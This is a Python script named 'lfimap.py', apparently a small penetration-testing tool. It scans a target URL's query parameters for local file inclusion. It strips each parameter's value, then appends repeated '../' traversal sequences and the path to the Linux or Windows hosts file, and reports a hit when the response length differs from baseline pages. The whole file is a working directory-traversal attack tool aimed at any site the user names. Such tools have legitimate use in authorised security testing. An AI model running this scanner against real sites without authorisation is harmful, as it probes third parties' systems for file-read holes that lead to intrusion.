#!/usr/bin/python3
# Very Simple Script for LFI Mapping. No pip.
# Made by sudosendit for Kalipack
# DEV IN PROGRESS


import urllib.request
import urllib.error
from urllib.parse import urlparse, parse_qs
import argparse

def getRequest(url):
    try:
        with urllib.request.urlopen(url, timeout=5) as response:
            status_code = response.getcode()
            headers = response.getheaders()
            headers_dict = dict(headers)
            content = response.read().decode('utf-8', errors='ignore')
            content_length = headers_dict.get('Content-Length', None)

            re = (status_code, headers_dict, content, content_length)
            return re

    except urllib.error.URLError as e:
        print(f"Error scanning {url}: {e}")


def vssLFIScan(url):
    vuln_count = 0
    traversal_string = '../'
    
    # Set traversal count
    traversal_count = args.traversal

    # Sets LFI target file
    if args.absolute_path is True:
        host_files = ('/windows/System32/drivers/etc/hosts', '/etc/hosts')
    else:    
        host_files = ('windows/System32/drivers/etc/hosts', 'etc/hosts')

    # Sets host file - default linux
    if args.windows is True:
        host_file = host_files[0]
    else:
        host_file = host_files[1]

    # Set webreq protocol - http or https
    protocols = ('https://', 'http://')
    if args.ssl is True:
        protocol = protocols[0]
    else:
        protocol = protocols[1]

    if not url.startswith(protocols):
        url = protocol + url
    
    # VERIFICATION - Find params in url e.g. ?lang= 
    parsed_queries = (urlparse(url)).query
    parameters = parse_qs(parsed_queries)
    if len(parameters) <= 0:
        print(f'lfimap.py: No parameters detected in url - {url}')
        return
    
    print(f"lfimap.py: Found parameters.")
    
    # Run GET loop for each param
    for parameter, value_list in parameters.items():
        request_pack = getRequest(url)
        default_length = request_pack[3]
        # Unpack headers here to check for windows
        for param, value in request_pack[1].items():
            if 'Server' in param and args.windows == False:
                if 'microsoft' in value.lower():
                    print('lfimap.py: Server responsed with Microsoft Server header please add --windows to your command.')
                    return

        
        for value in value_list:
            url = url.replace(value, '')

        default_length_broken = getRequest(url+'xyz')[3]
        default_length_broken_w_key = getRequest(url+traversal_string+'xyz')[3]

        print(f"\nlfimap.py: Default page content-length exlusion = {default_length}")
        print(f"lfimap.py: Broken page content-length exlusion = {default_length_broken} & {default_length_broken_w_key}\n")
        print(f"lfimap.py: Testing '{parameter}' parameter:")
        

        for count in range(traversal_count):
            # www.google.com=?lang= + ../ + etc/hosts
            modded_url = (url+(traversal_string*count)+host_file)
            request = getRequest(modded_url)
            request_content_length = request[3]
            if request_content_length != default_length and request_content_length != default_length_broken and request_content_length != default_length_broken_w_key:
                print(f'> LFI FOUND: {url+(traversal_string*count)+host_file}       [Status: {request[0]}, Content-Length: {request[3]}]')
                vuln_count += 1
            else:
                if args.verbose is True:
                    print(f'> {url+(traversal_string*count)+host_file}       [Status: {request[0]}, Content-Length: {request[3]} (LFI False)]')

    if vuln_count <= 0:
        print('\nlfimap.py: Unable to find Local File Inclusion, maybe try add --absolute-path or increase --traversal count.')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog="lfimap.py",
                                    usage="%(prog)s <URL>", 
                                    description='Use -h for help.')
    
    parser.add_argument('-u',
                        '--url',
                        required=True,
                        default=None,
                        help='The Target URL')
    
    parser.add_argument('-s',
                        '--ssl',
                        required=False,
                        action='store_true',
                        help='Enable SSL for scan')
    
    parser.add_argument('-win',
                        '--windows',
                        required=False,
                        action='store_true',
                        help='Target Windows Host File instead of linux')
    
    parser.add_argument('-v',
                        '--verbose',
                        required=False,
                        action='store_true',
                        help='Enable Verbose Logging')
    
    parser.add_argument('-a',
                        '--absolute-path',
                        required=False,
                        action='store_true',
                        help='Enable Absolute Path scan')
    
    parser.add_argument('-t',
                        '--traversal',
                        required=False,
                        default=5,
                        type=int,
                        help='Change Count of Traversal. Default = 5')


    args = parser.parse_args()
    

    if (args.url is not None):   
            vssLFIScan(args.url)
